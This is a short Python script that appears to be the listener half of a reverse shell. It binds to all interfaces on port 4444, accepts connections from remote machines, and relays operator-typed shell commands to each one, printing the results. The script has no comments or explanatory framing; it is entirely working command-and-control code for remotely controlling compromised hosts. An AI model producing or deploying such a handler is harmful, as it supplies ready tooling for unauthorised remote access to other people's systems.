import socket
import threading

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444

def handle_client(client_socket, addr):
    print(f"Connection from {addr}")

    while True:
        try:
            command = input(f"Shell ({addr})> ")
            if command.lower() == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                break
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except ConnectionResetError:
            print(f"Connection lost from {addr}")
            break

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((LISTEN_IP, LISTEN_PORT))
    server_socket.listen(5)
    print(f"Listening on {LISTEN_IP}:{LISTEN_PORT}")

    while True:
        client_socket, addr = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_handler.start()

if __name__ == "__main__":
    main()
